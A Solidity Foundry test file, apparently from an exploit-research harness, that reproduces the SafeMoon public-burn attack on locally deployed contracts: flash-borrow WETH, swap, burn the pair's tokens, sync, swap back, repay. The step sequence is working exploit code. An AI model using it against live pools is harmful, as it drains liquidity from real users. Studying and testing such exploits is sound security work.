// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BuyBackAndBurnFeeCollector} from "./BuyBackAndBurnFeeCollector.sol";
import {FeeJarAdmin} from "./FeeJarAdmin.sol";
import {FeeJar} from "./FeeJar.sol";
import {FeeSetter} from "./FeeSetter.sol";
import {LpFeeCollector} from "./LpFeeCollector.sol";
import {SafeSwapTradeRouter} from "./SafeSwapTradeRouter.sol";
import {Safemoon} from "./Safemoon.sol";
import {SafeswapFactory} from "./SafeswapFactory.sol";
import {SafeswapPair} from "./SafeswapPair.sol";
import {SafeswapRouterProxy1} from "./SafeswapRouterProxy1.sol";
import {WETH} from "@utils/WETH.sol";

contract SafemoonTestBase is Test, BlockLoader {
    Safemoon safemoon;
    WETH weth;
    FeeJar feejar;
    FeeJarAdmin feeJarAdmin;
    FeeSetter feeSetter;
    BuyBackAndBurnFeeCollector buyBackAndBurnFeeCollector;
    LpFeeCollector lpFeeCollector;
    SafeswapPair sfpairimpl;
    SafeswapPair pair;
    SafeswapFactory factory;
    SafeSwapTradeRouter tradeRouter;
    SafeswapRouterProxy1 router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address safemoonAddr;
    address wethAddr;
    address feejarAddr;
    address feeJarAdminAddr;
    address feeSetterAddr;
    address buyBackAndBurnFeeCollectorAddr;
    address lpFeeCollectorAddr;
    address sfpairimplAddr;
    address pairAddr;
    address factoryAddr;
    address tradeRouterAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1680000871;
    uint112 reserve0sfpairimpl = 0;
    uint112 reserve1sfpairimpl = 0;
    uint32 blockTimestampLastsfpairimpl = 0;
    uint256 kLastsfpairimpl = 0;
    uint256 price0CumulativeLastsfpairimpl = 0;
    uint256 price1CumulativeLastsfpairimpl = 0;
    uint256 totalSupplysafemoon = 1000000000000000000000;
    uint256 balanceOfsafemoonsfpairimpl = 0;
    uint256 balanceOfsafemoonattacker = 0;
    uint256 totalSupplyweth = 3533691745814785013767043;
    uint256 balanceOfwethsfpairimpl = 0;
    uint256 balanceOfwethattacker = 0;

    function setUp() public {
        owner = address(this);
        safemoon = new Safemoon();
        safemoonAddr = address(safemoon);
        weth = new WETH();
        wethAddr = address(weth);
        sfpairimpl = new SafeswapPair();
        sfpairimplAddr = address(sfpairimpl);
        feejar = new FeeJar();
        feejarAddr = address(feejar);
        feeJarAdmin = new FeeJarAdmin();
        feeJarAdminAddr = address(feeJarAdmin);
        feeSetter = new FeeSetter();
        feeSetterAddr = address(feeSetter);
        buyBackAndBurnFeeCollector = new BuyBackAndBurnFeeCollector();
        buyBackAndBurnFeeCollectorAddr = address(buyBackAndBurnFeeCollector);
        lpFeeCollector = new LpFeeCollector();
        lpFeeCollectorAddr = address(lpFeeCollector);
        factory = new SafeswapFactory();
        factoryAddr = address(factory);
        pair = new SafeswapPair();
        pairAddr = address(pair);
        tradeRouter = new SafeSwapTradeRouter();
        tradeRouterAddr = address(tradeRouter);
        router = new SafeswapRouterProxy1();
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        factory.initialize(address(0x0), address(0x0));
        factory.setRouter(address(router));
        factory.setImplementation(address(sfpairimpl));
        factory.setPair(
            address(safemoon),
            address(weth),
            address(safemoon),
            address(pair)
        );
        factory.approveLiquidityPartner(address(safemoon));
        factory.approveLiquidityPartner(address(weth));
        feejar.initialize(
            address(feeJarAdmin),
            address(feeSetter),
            address(buyBackAndBurnFeeCollector),
            address(lpFeeCollector),
            address(factory),
            10000,
            1200,
            6800,
            2000
        );
        tradeRouter.initialize(address(feejar), address(router), 25, 10000);
        router.initialize(address(factory), address(weth));
        router.setRouterTrade(address(tradeRouter));
        safemoon.initialize();
        safemoon.initRouterAndPair(address(router), address(pair));
        weth.approve(address(safemoon), 27457 ether);
        safemoon.afterDeploy();
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Safemoon Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(safemoon),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(safemoon),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(weth),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(weth),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feejar Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feejar),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feejar),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feejaradmin Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feeJarAdmin),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feeJarAdmin),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feesetter Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feeSetter),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feeSetter),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Buybackandburnfeecollector Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(buyBackAndBurnFeeCollector),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(buyBackAndBurnFeeCollector),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Lpfeecollector Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(lpFeeCollector),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(lpFeeCollector),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Sfpairimpl Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(sfpairimpl),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(sfpairimpl),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(pair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(pair),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Traderouter Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(tradeRouter),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(tradeRouter),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(attacker),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(attacker),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= 1e6 + balanceOfwethattacker;
    }

    function borrow_weth_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_weth_owner(uint256 amount) internal eurus {
        weth.transfer(owner, amount);
    }

    function borrow_safemoon_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        safemoon.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_safemoon_owner(uint256 amount) internal eurus {
        safemoon.transfer(owner, amount);
    }

    function swap_pair_attacker_weth_safemoon(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(safemoon);
        uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
        weth.approve(address(safemoon.uniswapV2Router()), amount);
        SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
            amountIn: amount,
            amountOut: 0,
            path: path,
            to: payable(address(attacker)),
            deadline: block.timestamp
        });
        weth.transfer(address(tradeRouter), feeAmount);
        tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
    }

    function swap_pair_attacker_safemoon_weth(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        address[] memory path = new address[](2);
        path[0] = address(safemoon);
        path[1] = address(weth);
        uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
        safemoon.approve(address(safemoon.uniswapV2Router()), amount);
        SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
            amountIn: amount,
            amountOut: 0,
            path: path,
            to: payable(address(attacker)),
            deadline: block.timestamp
        });
        weth.transfer(address(tradeRouter), feeAmount);
        tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
    }

    function burn_safemoon_pair(uint256 amount) internal eurus {
        safemoon.burn(safemoon.uniswapV2Pair(), amount);
        IUniswapV2Pair(safemoon.getPairAddr()).sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        emit log_named_uint("amt0", 1000 ether);
        borrow_weth_owner(1000 ether);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 800 * 1e18);
        emit log_named_uint("amt2", 0);
        swap_pair_attacker_weth_safemoon(800 * 1e18, 0);
        printBalance("After step1 ");
        emit log_named_uint(
            "amt3",
            safemoon.balanceOf(address(pair)) - 1000000000
        );
        burn_safemoon_pair(safemoon.balanceOf(address(pair)) - 1000000000);
        printBalance("After step2 ");
        emit log_named_uint("amt4", safemoon.balanceOf(address(attacker)));
        emit log_named_uint("amt5", 0);
        swap_pair_attacker_safemoon_weth(
            safemoon.balanceOf(address(attacker)),
            0
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 1000 ether);
        payback_weth_owner(1000 ether);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
